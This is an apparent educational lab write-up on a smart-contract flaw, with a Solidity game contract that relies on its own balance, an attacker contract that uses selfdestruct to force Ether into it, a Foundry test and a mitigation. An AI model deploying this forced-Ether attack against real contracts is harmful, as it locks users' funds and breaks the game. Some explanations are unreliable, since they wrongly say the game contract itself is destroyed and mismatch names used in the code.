# Selfdestruct  
[Selfdestruct.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Selfdestruct.sol)   
**Name:** Self-Destruct Vulnerability

**Description:**  
The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker to disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode).
The vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct operation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, the EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.

**Scenario:**

1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
3. Deploy Attack with address of EtherGame
4. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.

**What happened?**  
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
Due to missing or insufficient access controls, malicious parties can self-destruct the contract.
The selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.

**Mitigation:**  
Instead of relying on this.balance to track the deposited Ether,use a state variable to keep track of the total deposited amount.

**EtherGame Contract:**  
```
contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance; // vulnerable
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
``` 

****How to Test:****

forge test --contracts src/test/Selfdestruct.sol -vvvv  
```
// Test function for a scenario where selfdestruct is used.
function testSelfdestruct() public {
    // Log Alice's balance.
    console.log("Alice balance", alice.balance);
    // Log Eve's balance.
    console.log("Eve balance", eve.balance);

    // Log the start of Alice's deposit.
    console.log("Alice deposit 1 Ether...");
    // Set the message sender to Alice.
    vm.prank(alice);
    // Alice deposits 1 ether to the EtherGameContract.
    EtherGameContract.deposit{value: 1 ether}();

    // Log the start of Eve's deposit.
    console.log("Eve deposit 1 Ether...");
    // Set the message sender to Eve.
    vm.prank(eve);
    // Eve deposits 1 ether to the EtherGameContract.
    EtherGameContract.deposit{value: 1 ether}();

    // Log the balance of the EtherGameContract.
    console.log(
        "Balance of EtherGameContract",
        address(EtherGameContract).balance
    );

    // Log the start of the attack.
    console.log("Attack...");
    // Create a new instance of the Attack contract with EtherGameContract as a parameter.
    AttackerContract = new Attack(EtherGameContract);
    // Send 5 ether to the dos function of the AttackerContract.
    AttackerContract.dos{value: 5 ether}();

    // Log the new balance of the EtherGameContract after the attack.
    console.log(
        "Balance of EtherGameContract",
        address(EtherGameContract).balance
    );
    // Log the completion of the exploit.
    console.log("Exploit completed, Game is over");
    // Try to deposit 1 ether to the EtherGameContract. This call will fail as the contract has been destroyed.
    EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
}

// Contract to attack the EtherGame contract.
contract Attack {
    // The EtherGame contract to be attacked.
    EtherGame etherGame;

    // Constructor to set the EtherGame contract.
    constructor(EtherGame _etherGame) {
        etherGame = _etherGame;
    }

    // The function to perform the attack.
    function dos() public payable {
        // Break the game by sending ether so that the game balance is >= 7 ether.

        // Cast the EtherGame contract address to a payable address.
        address payable addr = payable(address(etherGame));
        // Self-destruct the contract and send its balance to the EtherGame contract.
        selfdestruct(addr);
    }
}
```  
Red box: exploited successful, game is over.  
![Alt text](image-1.png)